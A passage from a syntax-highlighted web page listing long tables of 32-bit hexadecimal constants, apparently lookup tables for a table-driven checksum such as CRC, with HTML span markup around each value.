class="number">0xD1525B21</span>, <span class="number">0x3B7C9B52</span>, <span class="number">0x9E3D092C</span>, <span class="number">0xEACD6D45</span>, <span class="number">0x4F8CFF3B</span>, <span class="number">0xA5A23F48</span>, <span class="number">0x00E3AD36</span>,</span><br><span class="line"><span class="number">0x3CE08A10</span>, <span class="number">0x99A1186E</span>, <span class="number">0x738FD81D</span>, <span class="number">0xD6CE4A63</span>, <span class="number">0xA23E2E0A</span>, <span class="number">0x077FBC74</span>, <span class="number">0xED517C07</span>, <span class="number">0x4810EE79</span>,</span><br><span class="line"><span class="number">0x04B1B4D5</span>, <span class="number">0xA1F026AB</span>, <span class="number">0x4BDEE6D8</span>, <span class="number">0xEE9F74A6</span>, <span class="number">0x9A6F10CF</span>, <span class="number">0x3F2E82B1</span>, <span class="number">0xD50042C2</span>, <span class="number">0x7041D0BC</span>,</span><br><span class="line"><span class="number">0xAD060C8E</span>, <span class="number">0x08479EF0</span>, <span class="number">0xE2695E83</span>, <span class="number">0x4728CCFD</span>, <span class="number">0x33D8A894</span>, <span class="number">0x96993AEA</span>, <span class="number">0x7CB7FA99</span>, <span class="number">0xD9F668E7</span>,</span><br><span class="line"><span class="number">0x9557324B</span>, <span class="number">0x3016A035</span>, <span class="number">0xDA386046</span>, <span class="number">0x7F79F238</span>, <span class="number">0x0B899651</span>, <span class="number">0xAEC8042F</span>, <span class="number">0x44E6C45C</span>, <span class="number">0xE1A75622</span>,</span><br><span class="line"><span class="number">0xDDA47104</span>, <span class="number">0x78E5E37A</span>, <span class="number">0x92CB2309</span>, <span class="number">0x378AB177</span>, <span class="number">0x437AD51E</span>, <span class="number">0xE63B4760</span>, <span class="number">0x0C158713</span>, <span class="number">0xA954156D</span>,</span><br><span class="line"><span class="number">0xE5F54FC1</span>, <span class="number">0x40B4DDBF</span>, <span class="number">0xAA9A1DCC</span>, <span class="number">0x0FDB8FB2</span>, <span class="number">0x7B2BEBDB</span>, <span class="number">0xDE6A79A5</span>, <span class="number">0x3444B9D6</span>, <span class="number">0x91052BA8</span>,</span><br><span class="line"><span class="number">0x00000000</span>, <span class="number">0xDD45AAB8</span>, <span class="number">0xBF672381</span>, <span class="number">0x62228939</span>, <span class="number">0x7B2231F3</span>, <span class="number">0xA6679B4B</span>, <span class="number">0xC4451272</span>, <span class="number">0x1900B8CA</span>,</span><br><span class="line"><span class="number">0xF64463E6</span>, <span class="number">0x2B01C95E</span>, <span class="number">0x49234067</span>, <span class="number">0x9466EADF</span>, <span class="number">0x8D665215</span>, <span class="number">0x5023F8AD</span>, <span class="number">0x32017194</span>, <span class="number">0xEF44DB2C</span>,</span><br><span class="line"><span class="number">0xE964B13D</span>, <span class="number">0x34211B85</span>, <span class="number">0x560392BC</span>, <span class="number">0x8B463804</span>, <span class="number">0x924680CE</span>, <span class="number">0x4F032A76</span>, <span class="number">0x2D21A34F</span>, <span class="number">0xF06409F7</span>,</span><br><span class="line"><span class="number">0x1F20D2DB</span>, <span class="number">0xC2657863</span>, <span class="number">0xA047F15A</span>, <span class="number">0x7D025BE2</span>, <span class="number">0x6402E328</span>, <span class="number">0xB9474990</span>, <span class="number">0xDB65C0A9</span>, <span class="number">0x06206A11</span>,</span><br><span class="line"><span class="number">0xD725148B</span>, <span class="number">0x0A60BE33</span>, <span class="number">0x6842370A</span>, <span class="number">0xB5079DB2</span>, <span class="number">0xAC072578</span>, <span class="number">0x71428FC0</span>, <span class="number">0x136006F9</span>, <span class="number">0xCE25AC41</span>,</span><br><span class="line"><span class="number">0x2161776D</span>, <span class="number">0xFC24DDD5</span>, <span class="number">0x9E0654EC</span>, <span class="number">0x4343FE54</span>, <span class="number">0x5A43469E</span>, <span class="number">0x8706EC26</span>, <span class="number">0xE524651F</span>, <span class="number">0x3861CFA7</span>,</span><br><span class="line"><span class="number">0x3E41A5B6</span>, <span class="number">0xE3040F0E</span>, <span class="number">0x81268637</span>, <span class="number">0x5C632C8F</span>, <span class="number">0x45639445</span>, <span class="number">0x98263EFD</span>, <span class="number">0xFA04B7C4</span>, <span class="number">0x27411D7C</span>,</span><br><span class="line"><span class="number">0xC805C650</span>, <span class="number">0x15406CE8</span>, <span class="number">0x7762E5D1</span>, <span class="number">0xAA274F69</span>, <span class="number">0xB327F7A3</span>, <span class="number">0x6E625D1B</span>, <span class="number">0x0C40D422</span>, <span class="number">0xD1057E9A</span>,</span><br><span class="line"><span class="number">0xABA65FE7</span>, <span class="number">0x76E3F55F</span>, <span class="number">0x14C17C66</span>, <span class="number">0xC984D6DE</span>, <span class="number">0xD0846E14</span>, <span class="number">0x0DC1C4AC</span>, <span class="number">0x6FE34D95</span>, <span class="number">0xB2A6E72D</span>,</span><br><span class="line"><span class="number">0x5DE23C01</span>, <span class="number">0x80A796B9</span>, <span class="number">0xE2851F80</span>, <span class="number">0x3FC0B538</span>, <span class="number">0x26C00DF2</span>, <span class="number">0xFB85A74A</span>, <span class="number">0x99A72E73</span>, <span class="number">0x44E284CB</span>,</span><br><span class="line"><span class="number">0x42C2EEDA</span>, <span class="number">0x9F874462</span>, <span class="number">0xFDA5CD5B</span>, <span class="number">0x20E067E3</span>, <span class="number">0x39E0DF29</span>, <span class="number">0xE4A57591</span>, <span class="number">0x8687FCA8</span>, <span class="number">0x5BC25610</span>,</span><br><span class="line"><span class="number">0xB4868D3C</span>, <span class="number">0x69C32784</span>, <span class="number">0x0BE1AEBD</span>, <span class="number">0xD6A40405</span>, <span class="number">0xCFA4BCCF</span>, <span class="number">0x12E11677</span>, <span class="number">0x70C39F4E</span>, <span class="number">0xAD8635F6</span>,</span><br><span class="line"><span class="number">0x7C834B6C</span>, <span class="number">0xA1C6E1D4</span>, <span class="number">0xC3E468ED</span>, <span class="number">0x1EA1C255</span>, <span class="number">0x07A17A9F</span>, <span class="number">0xDAE4D027</span>, <span class="number">0xB8C6591E</span>, <span class="number">0x6583F3A6</span>,</span><br><span class="line"><span class="number">0x8AC7288A</span>, <span class="number">0x57828232</span>, <span class="number">0x35A00B0B</span>, <span class="number">0xE8E5A1B3</span>, <span class="number">0xF1E51979</span>, <span class="number">0x2CA0B3C1</span>, <span class="number">0x4E823AF8</span>, <span class="number">0x93C79040</span>,</span><br><span class="line"><span class="number">0x95E7FA51</span>, <span class="number">0x48A250E9</span>, <span class="number">0x2A80D9D0</span>, <span class="number">0xF7C57368</span>, <span class="number">0xEEC5CBA2</span>, <span class="number">0x3380611A</span>, <span class="number">0x51A2E823</span>, <span class="number">0x8CE7429B</span>,</span><br><span class="line"><span class="number">0x63A399B7</span>, <span class="number">0xBEE6330F</span>, <span class="number">0xDCC4BA36</span>, <span class="number">0x0181108E</span>, <span class="number">0x1881A844</span>, <span class="number">0xC5C402FC</span>, <span class="number">0xA7E68BC5</span>, <span class="number">0x7AA3217D</span>,</span><br><span class="line"><span class="number">0x52A0C93F</span>, <span class="number">0x8FE56387</span>, <span class="number">0xEDC7EABE</span>, <span class="number">0x30824006</span>, <span class="number">0x2982F8CC</span>, <span class="number">0xF4C75274</span>, <span class="number">0x96E5DB4D</span>, <span class="number">0x4BA071F5</span>,</span><br><span class="line"><span class="number">0xA4E4AAD9</span>, <span class="number">0x79A10061</span>, <span class="number">0x1B838958</span>, <span class="number">0xC6C623E0</span>, <span class="number">0xDFC69B2A</span>, <span class="number">0x02833192</span>, <span class="number">0x60A1B8AB</span>, <span class="number">0xBDE41213</span>,</span><br><span class="line"><span class="number">0xBBC47802</span>, <span class="number">0x6681D2BA</span>, <span class="number">0x04A35B83</span>, <span class="number">0xD9E6F13B</span>, <span class="number">0xC0E649F1</span>, <span class="number">0x1DA3E349</span>, <span class="number">0x7F816A70</span>, <span class="number">0xA2C4C0C8</span>,</span><br><span class="line"><span class="number">0x4D801BE4</span>, <span class="number">0x90C5B15C</span>, <span class="number">0xF2E73865</span>, <span class="number">0x2FA292DD</span>, <span class="number">0x36A22A17</span>, <span class="number">0xEBE780AF</span>, <span class="number">0x89C50996</span>, <span class="number">0x5480A32E</span>,</span><br><span class="line"><span class="number">0x8585DDB4</span>, <span class="number">0x58C0770C</span>, <span class="number">0x3AE2FE35</span>, <span class="number">0xE7A7548D</span>, <span class="number">0xFEA7EC47</span>, <span class="number">0x23E246FF</span>, <span class="number">0x41C0CFC6</span>, <span class="number">0x9C85657E</span>,</span><br><span class="line"><span class="number">0x73C1BE52</span>, <span class="number">0xAE8414EA</span>, <span class="number">0xCCA69DD3</span>, <span class="number">0x11E3376B</span>, <span class="number">0x08E38FA1</span>, <span class="number">0xD5A62519</span>, <span class="number">0xB784AC20</span>, <span class="number">0x6AC10698</span>,</span><br><span class="line"><span class="number">0x6CE16C89</span>, <span class="number">0xB1A4C631</span>, <span class="number">0xD3864F08</span>, <span class="number">0x0EC3E5B0</span>, <span class="number">0x17C35D7A</span>, <span class="number">0xCA86F7C2</span>, <span class="number">0xA8A47EFB</span>, <span class="number">0x75E1D443</span>,</span><br><span class="line"><span class="number">0x9AA50F6F</span>, <span class="number">0x47E0A5D7</span>, <span class="number">0x25C22CEE</span>, <span class="number">0xF8878656</span>, <span class="number">0xE1873E9C</span>, <span class="number">0x3CC29424</span>, <span class="number">0x5EE01D1D</span>, <span class="number">0x83A5B7A5</span>,</span><br><span class="line"><span class="number">0xF90696D8</span>, <span class="number">0x24433C60</span>, <span class="number">0x4661B559</span>, <span class="number">0x9B241FE1</span>, <span class="number">0x8224A72B</span>, <span class="number">0x5F610D93</span>, <span class="number">0x3D4384AA</span>, <span class="number">0xE0062E12</span>,</span><br><span class="line"><span class="number">0x0F42F53E</span>, <span class="number">0xD2075F86</span>, <span class="number">0xB025D6BF</span>, <span class="number">0x6D607C07</span>, <span class="number">0x7460C4CD</span>, <span class="number">0xA9256E75</span>, <span class="number">0xCB07E74C</span>, <span class="number">0x16424DF4</span>,</span><br><span class="line"><span class="number">0x106227E5</span>, <span class="number">0xCD278D5D</span>, <span class="number">0xAF050464</span>, <span class="number">0x7240AEDC</span>, <span class="number">0x6B401616</span>, <span class="number">0xB605BCAE</span>, <span class="number">0xD4273597</span>, <span class="number">0x09629F2F</span>,</span><br><span class="line"><span class="number">0xE6264403</span>, <span class="number">0x3B63EEBB</span>, <span class="number">0x59416782</span>, <span class="number">0x8404CD3A</span>, <span class="number">0x9D0475F0</span>, <span class="number">0x4041DF48</span>, <span class="number">0x22635671</span>, <span class="number">0xFF26FCC9</span>,</span><br><span class="line"><span class="number">0x2E238253</span>, <span class="number">0xF36628EB</span>, <span class="number">0x9144A1D2</span>, <span class="number">0x4C010B6A</span>, <span class="number">0x5501B3A0</span>, <span class="number">0x88441918</span>, <span class="number">0xEA669021</span>, <span class="number">0x37233A99</span>,</span><br><span class="line"><span class="number">0xD867E1B5</span>, <span class="number">0x05224B0D</span>, <span class="number">0x6700C234</span>, <span class="number">0xBA45688C</span>, <span class="number">0xA345D046</span>, <span class="number">0x7E007AFE</span>, <span class="number">0x1C22F3C7</span>, <span class="number">0xC167597F</span>,</span><br><span class="line"><span class="number">0xC747336E</span>, <span class="number">0x1A0299D6</span>, <span class="number">0x782010EF</span>, <span class="number">0xA565BA57</span>, <span class="number">0xBC65029D</span>, <span class="number">0x6120A825</span>, <span class="number">0x0302211C</span>, <span class="number">0xDE478BA4</span>,</span><br><span class="line"><span class="number">0x31035088</span>, <span class="number">0xEC46FA30</span>, <span class="number">0x8E647309</span>, <span class="number">0x5321D9B1</span>, <span class="number">0x4A21617B</span>, <span class="number">0x9764CBC3</span>, <span class="number">0xF54642FA</span>, <span class="number">0x2803E842</span>,</span><br><span class="line"><span class="number">0x00000000</span>, <span class="number">0x38116FAC</span>, <span class="number">0x7022DF58</span>, <span class="number">0x4833B0F4</span>, <span class="number">0xE045BEB0</span>, <span class="number">0xD854D11C</span>, <span class="number">0x906761E8</span>, <span class="number">0xA8760E44</span>,</span><br><span class="line"><span class="number">0xC5670B91</span>, <span class="number">0xFD76643D</span>, <span class="number">0xB545D4C9</span>, <span class="number">0x8D54BB65</span>, <span class="number">0x2522B521</span>, <span class="number">0x1D33DA8D</span>, <span class="number">0x55006A79</span>, <span class="number">0x6D1105D5</span>,</span><br><span class="line"><span class="number">0x8F2261D3</span>, <span class="number">0xB7330E7F</span>, <span class="number">0xFF00BE8B</span>, <span class="number">0xC711D127</span>, <span class="number">0x6F67DF63</span>, <span class="number">0x5776B0CF</span>, <span class="number">0x1F45003B</span>, <span class="number">0x27546F97</span>,</span><br><span class="line"><span class="number">0x4A456A42</span>, <span class="number">0x725405EE</span>, <span class="number">0x3A67B51A</span>, <span class="number">0x0276DAB6</span>, <span class="number">0xAA00D4F2</span>, <span class="number">0x9211BB5E</span>, <span class="number">0xDA220BAA</span>, <span class="number">0xE2336406</span>,</span><br><span class="line"><span class="number">0x1BA8B557</span>, <span class="number">0x23B9DAFB</span>, <span class="number">0x6B8A6A0F</span>, <span class="number">0x539B05A3</span>, <span class="number">0xFBED0BE7</span>, <span class="number">0xC3FC644B</span>, <span class="number">0x8BCFD4BF</span>, <span class="number">0xB3DEBB13</span>,</span><br><span class="line"><span class="number">0xDECFBEC6</span>, <span class="number">0xE6DED16A</span>, <span class="number">0xAEED619E</span>, <span class="number">0x96FC0E32</span>, <span class="number">0x3E8A0076</span>, <span class="number">0x069B6FDA</span>, <span class="number">0x4EA8DF2E</span>, <span class="number">0x76B9B082</span>,</span><br><span class="line"><span class="number">0x948AD484</span>, <span class="number">0xAC9BBB28</span>, <span class="number">0xE4A80BDC</span>, <span class="number">0xDCB96470</span>, <span class="number">0x74CF6A34</span>, <span class="number">0x4CDE0598</span>, <span class="number">0x04EDB56C</span>, <span class="number">0x3CFCDAC0</span>,</span><br><span class="line"><span class="number">0x51EDDF15</span>, <span class="number">0x69FCB0B9</span>, <span class="number">0x21CF004D</span>, <span class="number">0x19DE6FE1</span>, <span class="number">0xB1A861A5</span>, <span class="number">0x89B90E09</span>, <span class="number">0xC18ABEFD</span>, <span class="number">0xF99BD151</span>,</span><br><span class="line"><span class="number">0x37516AAE</span>, <span class="number">0x0F400502</span>, <span class="number">0x4773B5F6</span>, <span class="number">0x7F62DA5A</span>, <span class="number">0xD714D41E</span>, <span class="number">0xEF05BBB2</span>, <span class="number">0xA7360B46</span>, <span class="number">0x9F2764EA</span>,</span><br><span class="line"><span class="number">0xF236613F</span>, <span class="number">0xCA270E93</span>, <span class="number">0x8214BE67</span>, <span class="number">0xBA05D1CB</span>, <span class="number">0x1273DF8F</span>, <span class="number">0x2A62B023</span>, <span class="number">0x625100D7</span>, <span class="number">0x5A406F7B</span>,</span><br><span class="line"><span class="number">0xB8730B7D</span>, <span class="number">0x806264D1</span>, <span class="number">0xC851D425</span>, <span class="number">0xF040BB89</span>, <span class="number">0x5836B5CD</span>, <span class="number">0x6027DA61</span>, <span class="number">0x28146A95</span>, <span class="number">0x10050539</span>,</span><br><span class="line"><span class="number">0x7D1400EC</span>, <span class="number">0x45056F40</span>, <span class="number">0x0D36DFB4</span>, <span class="number">0x3527B018</span>, <span class="number">0x9D51BE5C</span>, <span class="number">0xA540D1F0</span>, <span class="number">0xED736104</span>, <span class="number">0xD5620EA8</span>,</span><br><span class="line"><span class="number">0x2CF9DFF9</span>, <span class="number">0x14E8B055</span>, <span class="number">0x5CDB00A1</span>, <span class="number">0x64CA6F0D</span>, <span class="number">0xCCBC6149</span>, <span class="number">0xF4AD0EE5</span>, <span class="number">0xBC9EBE11</span>, <span class="number">0x848FD1BD</span>,</span><br><span class="line"><span class="number">0xE99ED468</span>, <span class="number">0xD18FBBC4</span>, <span class="number">0x99BC0B30</span>, <span class="number">0xA1AD649C</span>, <span class="number">0x09DB6AD8</span>, <span class="number">0x31CA0574</span>, <span class="number">0x79F9B580</span>, <span class="number">0x41E8DA2C</span>,</span><br><span class="line"><span class="number">0xA3DBBE2A</span>, <span class="number">0x9BCAD186</span>, <span class="number">0xD3F96172</span>, <span class="number">0xEBE80EDE</span>, <span class="number">0x439E009A</span>, <span class="number">0x7B8F6F36</span>, <span class="number">0x33BCDFC2</span>, <span class="number">0x0BADB06E</span>,</span><br><span class="line"><span class="number">0x66BCB5BB</span>, <span class="number">0x5EADDA17</span>, <span class="number">0x169E6AE3</span>, <span class="number">0x2E8F054F</span>, <span class="number">0x86F90B0B</span>, <span class="number">0xBEE864A7</span>, <span class="number">0xF6DBD453</span>, <span class="number">0xCECABBFF</span>,</span><br><span class="line"><span class="number">0x6EA2D55C</span>, <span class="number">0x56B3BAF0</span>, <span class="number">0x1E800A04</span>, <span class="number">0x269165A8</span>, <span class="number">0x8EE76BEC</span>, <span class="number">0xB6F60440</span>, <span class="number">0xFEC5B4B4</span>, <span class="number">0xC6D4DB18</span>,</span><br><span class="line"><span class="number">0xABC5DECD</span>, <span class="number">0x93D4B161</span>, <span class="number">0xDBE70195</span>, <span class="number">0xE3F66E39</span>, <span class="number">0x4B80607D</span>, <span class="number">0x73910FD1</span>, <span class="number">0x3BA2BF25</span>, <span class="number">0x03B3D089</span>,</span><br><span class="line"><span class="number">0xE180B48F</span>, <span class="number">0xD991DB23</span>, <span class="number">0x91A26BD7</span>, <span class="number">0xA9B3047B</span>, <span class="number">0x01C50A3F</span>, <span class="number">0x39D46593</span>, <span class="number">0x71E7D567</span>, <span class="number">0x49F6BACB</span>,</span><br><span class="line"><span class="number">0x24E7BF1E</span>, <span class="number">0x1CF6D0B2</span>, <span class="number">0x54C56046</span>, <span class="number">0x6CD40FEA</span>, <span class="number">0xC4A201AE</span>, <span class="number">0xFCB36E02</span>, <span class="number">0xB480DEF6</span>, <span class="number">0x8C91B15A</span>,</span><br><span class="line"><span class="number">0x750A600B</span>, <span class="number">0x4D1B0FA7</span>, <span class="number">0x0528BF53</span>, <span class="number">0x3D39D0FF</span>, <span class="number">0x954FDEBB</span>, <span class="number">0xAD5EB117</span>, <span class="number">0xE56D01E3</span>, <span class="number">0xDD7C6E4F</span>,</span><br><span class="line"><span class="number">0xB06D6B9A</span>, <span class="number">0x887C0436</span>, <span class="number">0xC04FB4C2</span>, <span class="number">0xF85EDB6E</span>, <span class="number">0x5028D52A</span>, <span class="number">0x6839BA86</span>, <span class="number">0x200A0A72</span>, <span class="number">0x181B65DE</span>,</span><br><span class="line"><span class="number">0xFA2801D8</span>, <span class="number">0xC2396E74</span>, <span class="number">0x8A0ADE80</span>, <span class="number">0xB21BB12C</span>, <span class="number">0x1A6DBF68</span>, <span class="number">0x227CD0C4</span>, <span class="number">0x6A4F6030</span>, <span class="number">0x525E0F9C</span>,</span><br><span class="line"><span class="number">0x3F4F0A49</span>, <span class="number">0x075E65E5</span>, <span class="number">0x4F6DD511</span>, <span class="number">0x777CBABD</span>, <span class="number">0xDF0AB4F9</span>, <span class="number">0xE71BDB55</span>, <span class="number">0xAF286BA1</span>, <span class="number">0x9739040D</span>,</span><br><span class="line"><span class="number">0x59F3BFF2</span>, <span class="number">0x61E2D05E</span>, <span class="number">0x29D160AA</span>, <span class="number">0x11C00F06</span>, <span class="number">0xB9B60142</span>, <span class="number">0x81A76EEE</span>, <span class="number">0xC994DE1A</span>, <span class="number">0xF185B1B6</span>,</span><br><span class="line"><span class="number">0x9C94B463</span>, <span class="number">0xA485DBCF</span>, <span class="number">0xECB66B3B</span>, <span class="number">0xD4A70497</span>, <span class="number">0x7CD10AD3</span>, <span class="number">0x44C0657F</span>, <span class="number">0x0CF3D58B</span>, <span class="number">0x34E2BA27</span>,</span><br><span class="line"><span class="number">0xD6D1DE21</span>, <span class="number">0xEEC0B18D</span>, <span class="number">0xA6F30179</span>, <span class="number">0x9EE26ED5</span>, <span class="number">0x36946091</span>, <span class="number">0x0E850F3D</span>, <span class="number">0x46B6BFC9</span>, <span class="number">0x7EA7D065</span>,</span><br><span class="line"><span class="number">0x13B6D5B0</span>, <span class="number">0x2BA7BA1C</span>, <span class="number">0x63940AE8</span>, <span class="number">0x5B856544</span>, <span class="number">0xF3F36B00</span>, <span class="number">0xCBE204AC</span>, <span class="number">0x83D1B458</span>, <span class="number">0xBBC0DBF4</span>,</span><br><span class="line"><span class="number">0x425B0AA5</span>, <span class="number">0x7A4A6509</span>, <span class="number">0x3279D5FD</span>, <span class="number">0x0A68BA51</span>, <span class="number">0xA21EB415</span>, <span class="number">0x9A0FDBB9</span>, <span class="number">0xD23C6B4D</span>, <span class="number">0xEA2D04E1</span>,</span><br><span class="line"><span class="number">0x873C0134</span>, <span class="number">0xBF2D6E98</span>, <span class="number">0xF71EDE6C</span>, <span class="number">0xCF0FB1C0</span>, <span class="number">0x6779BF84</span>, <span class="number">0x5F68D028</span>, <span class="number">0x175B60DC</span>, <span class="number">0x2F4A0F70</span>,</span><br><span class="line"><span class="number">0xCD796B76</span>, <span class="number">0xF56804DA</span>, <span class="number">0xBD5BB42E</span>, <span class="number">0x854ADB82</span>, <span class="number">0x2D3CD5C6</span>, <span class="number">0x152DBA6A</span>, <span class="number">0x5D1E0A9E</span>, <span class="number">0x650F6532</span>,</span><br><span class="line"><span class="number">0x081E60E7</span>, <span class="number">0x300F0F4B</span>, <span class="number">0x783CBFBF</span>, <span class="number">0x402DD013</span>, <span class="number">0xE85BDE57</span>, <span class="number">0xD04AB1FB</span>, <span class="number">0x9879010F</span>, <span class="number">0xA0686EA3</span>,</span><br><span class="line"><span class="number">0x00000000</span>, <span class="number">0xEF306B19</span>, <span class="number">0xDB8CA0C3</span>, <span class="number">0x34BCCBDA</span>, <span class="number">0xB2F53777</span>, <span class="number">0x5DC55C6E</span>, <span class="number">0x697997B4</span>, <span class="number">0x8649FCAD</span>,</span><br><span class="line"><span class="number">0x6006181F</span>, <span class="number">0x8F367306</span>, <span class="number">0xBB8AB8DC</span>, <span class="number">0x54BAD3C5</span>, <span class="number">0xD2F32F68</span>, <span class="number">0x3DC34471</span>, <span class="number">0x097F8FAB</span>, <span class="number">0xE64FE4B2</span>,</span><br><span class="line"><span class="number">0xC00C303E</span>, <span class="number">0x2F3C5B27</span>, <span class="number">0x1B8090FD</span>, <span class="number">0xF4B0FBE4</span>, <span class="number">0x72F90749</span>, <span class="number">0x9DC96C50</span>, <span class="number">0xA975A78A</span>, <span class="number">0x4645CC93</span>,</span><br><span class="line"><span class="number">0xA00A2821</span>, <span class="number">0x4F3A4338</span>, <span class="number">0x7B8688E2</span>, <span class="number">0x94B6E3FB</span>, <span class="number">0x12FF1F56</span>, <span class="number">0xFDCF744F</span>, <span class="number">0xC973BF95</span>, <span class="number">0x2643D48C</span>,</span><br><span class="line"><span class="number">0x85F4168D</span>, <span class="number">0x6AC47D94</span>, <span class="number">0x5E78B64E</span>, <span class="number">0xB148DD57</span>, <span class="number">0x370121FA</span>, <span class="number">0xD8314AE3</span>, <span class="number">0xEC8D8139</span>, <span class="number">0x03BDEA20</span>,</span><br><span class="line"><span class="number">0xE5F20E92</span>, <span class="number">0x0AC2658B</span>, <span class="number">0x3E7EAE51</span>, <span class="number">0xD14EC548</span>, <span class="number">0x570739E5</span>, <span class="number">0xB83752FC</span>, <span class="number">0x8C8B9926</span>, <span class="number">0x63BBF23F</span>,</span><br><span class="line"><span class="number">0x45F826B3</span>, <span class="number">0xAAC84DAA</span>, <span class="number">0x9E748670</span>, <span class="number">0x7144ED69</span>, <span class="number">0xF70D11C4</span>, <span class="number">0x183D7ADD</span>, <span class="number">0x2C81B107</span>, <span class="number">0xC3B1DA1E</span>,</span><br><span class="line"><span class="number">0x25FE3EAC</span>, <span class="number">0xCACE55B5</span>, <span class="number">0xFE729E6F</span>, <span class="number">0x1142F576</span>, <span class="number">0x970B09DB</span>, <span class="number">0x783B62C2</span>, <span class="number">0x4C87A918</span>, <span class="number">0xA3B7C201</span>,</span><br><span class="line"><span class="number">0x0E045BEB</span>, <span class="number">0xE13430F2</span>, <span class="number">0xD588FB28</span>, <span class="number">0x3AB89031</span>, <span class="number">0xBCF16C9C</span>, <span class="number">0x53C10785</span>, <span class="number">0x677DCC5F</span>, <span class="number">0x884DA746</span>,</span><br><span class="line"><span class="number">0x6E0243F4</span>, <span class="number">0x813228ED</span>, <span class="number">0xB58EE337</span>, <span class="number">0x5ABE882E</span>, <span class="number">0xDCF77483</span>, <span class="number">0x33C71F9A</span>, <span class="number">0x077BD440</span>, <span class="number">0xE84BBF59</span>,</span><br><span class="line"><span class="number">0xCE086BD5</span>, <span class="number">0x213800CC</span>, <span class="number">0x1584CB16</span>, <span class="number">0xFAB4A00F</span>, <span class="number">0x7CFD5CA2</span>, <span class="number">0x93CD37BB</span>, <span class="number">0xA771FC61</span>, <span class="number">0x48419778</span>,</span><br><span class="line"><span class="number">0xAE0E73CA</span>, <span class="number">0x413E18D3</span>, <span class="number">0x7582D309</span>, <span class="number">0x9AB2B810</span>, <span class="number">0x1CFB44BD</span>, <span class="number">0xF3CB2FA4</span>, <span class="number">0xC777E47E</span>, <span class="number">0x28478F67</span>,</span><br><span class="line"><span class="number">0x8BF04D66</span>, <span class="number">0x64C0267F</span>, <span class="number">0x507CEDA5</span>, <span class="number">0xBF4C86BC</span>, <span class="number">0x39057A11</span>, <span class="number">0xD6351108</span>, <span class="number">0xE289DAD2</span>, <span class="number">0x0DB9B1CB</span>,</span><br><span class="line"><span class="number">0xEBF65579</span>, <span class="number">0x04C63E60</span>, <span class="number">0x307AF5BA</span>, <span class="number">0xDF4A9EA3</span>, <span class="number">0x5903620E</span>, <span class="number">0xB6330917</span>, <span class="number">0x828FC2CD</span>, <span class="number">0x6DBFA9D4</span>,</span><br><span class="line"><span class="number">0x4BFC7D58</span>, <span class="number">0xA4CC1641</span>, <span class="number">0x9070DD9B</span>, <span class="number">0x7F40B682</span>, <span class="number">0xF9094A2F</span>, <span class="number">0x16392136</span>, <span class="number">0x2285EAEC</span>, <span class="number">0xCDB581F5</span>,</span><br><span class="line"><span class="number">0x2BFA6547</span>, <span class="number">0xC4CA0E5E</span>, <span class="number">0xF076C584</span>, <span class="number">0x1F46AE9D</span>, <span class="number">0x990F5230</span>, <span class="number">0x763F3929</span>, <span class="number">0x4283F2F3</span>, <span class="number">0xADB399EA</span>,</span><br><span class="line"><span class="number">0x1C08B7D6</span>, <span class="number">0xF338DCCF</span>, <span class="number">0xC7841715</span>, <span class="number">0x28B47C0C</span>, <span class="number">0xAEFD80A1</span>, <span class="number">0x41CDEBB8</span>, <span class="number">0x75712062</span>, <span class="number">0x9A414B7B</span>,</span><br><span class="line"><span class="number">0x7C0EAFC9</span>, <span class="number">0x933EC4D0</span>, <span class="number">0xA7820F0A</span>, <span class="number">0x48B26413</span>, <span class="number">0xCEFB98BE</span>, <span class="number">0x21CBF3A7</span>, <span class="number">0x1577387D</span>, <span class="number">0xFA475364</span>,</span><br><span class="line"><span class="number">0xDC0487E8</span>, <span class="number">0x3334ECF1</span>, <span class="number">0x0788272B</span>, <span class="number">0xE8B84C32</span>, <span class="number">0x6EF1B09F</span>, <span class="number">0x81C1DB86</span>, <span class="number">0xB57D105C</span>, <span class="number">0x5A4D7B45</span>,</span><br><span class="line"><span class="number">0xBC029FF7</span>, <span class="number">0x5332F4EE</span>, <span class="number">0x678E3F34</span>, <span class="number">0x88BE542D</span>, <span class="number">0x0EF7A880</span>, <span class="number">0xE1C7C399</span>, <span class="number">0xD57B0843</span>, <span class="number">0x3A4B635A</span>,</span><br><span class="line"><span class="number">0x99FCA15B</span>, <span class="number">0x76CCCA42</span>, <span class="number">0x42700198</span>, <span class="number">0xAD406A81</span>, <span class="number">0x2B09962C</span>, <span class="number">0xC439FD35</span>, <span class="number">0xF08536EF</span>, <span class="number">0x1FB55DF6</span>,</span><br><span class="line"><span class="number">0xF9FAB944</span>, <span class="number">0x16CAD25D</span>, <span class="number">0x22761987</span>, <span class="number">0xCD46729E</span>, <span class="number">0x4B0F8E33</span>, <span class="number">0xA43FE52A</span>, <span class="number">0x90832EF0</span>, <span class="number">0x7FB345E9</span>,</span><br><span class="line"><span class="number">0x59F09165</span>, <span class="number">0xB6C0FA7C</span>, <span class="number">0x827C31A6</span>, <span class="number">0x6D4C5ABF</span>, <span class="number">0xEB05A612</span>, <span class="number">0x0435CD0B</span>, <span class="number">0x308906D1</span>, <span class="number">0xDFB96DC8</span>,</span><br><span class="line"><span class="number">0x39F6897A</span>, <span class="number">0xD6C6E263</span>, <span class="number">0xE27A29B9</span>, <span class="number">0x0D4A42A0</span>, <span class="number">0x8B03BE0D</span>, <span class="number">0x6433D514</span>, <span class="number">0x508F1ECE</span>, <span class="number">0xBFBF75D7</span>,</span><br><span class="line"><span class="number">0x120CEC3D</span>, <span class="number">0xFD3C8724</span>, <span class="number">0xC9804CFE</span>, <span class="number">0x26B027E7</span>, <span class="number">0xA0F9DB4A</span>, <span class="number">0x4FC9B053</span>, <span class="number">0x7B757B89</span>, <span class="number">0x94451090</span>,</span><br><span class="line"><span class="number">0x720AF422</span>, <span class="number">0x9D3A9F3B</span>, <span class="number">0xA98654E1</span>, <span class="number">0x46B63FF8</span>, <span class="number">0xC0FFC355</span>, <span class="number">0x2FCFA84C</span>, <span class="number">0x1B736396</span>, <span class="number">0xF443088F</span>,</span><br><span class="line"><span class="number">0xD200DC03</span>, <span class="number">0x3D30B71A</span>, <span class="number">0x098C7CC0</span>, <span class="number">0xE6BC17D9</span>, <span class="number">0x60F5EB74</span>, <span class="number">0x8FC5806D</span>, <span class="number">0xBB794BB7</span>, <span class="number">0x544920AE</span>,</span><br><span class="line"><span class="number">0xB206C41C</span>, <span class="number">0x5D36AF05</span>, <span class="number">0x698A64DF</span>, <span class="number">0x86BA0FC6</span>, <span class="number">0x00F3F36B</span>, <span class="number">0xEFC39872</span>, <span class="number">0xDB7F53A8</span>, <span class="number">0x344F38B1</span>,</span><br><span class="line"><span class="number">0x97F8FAB0</span>, <span class="number">0x78C891A9</span>, <span class="number">0x4C745A73</span>, 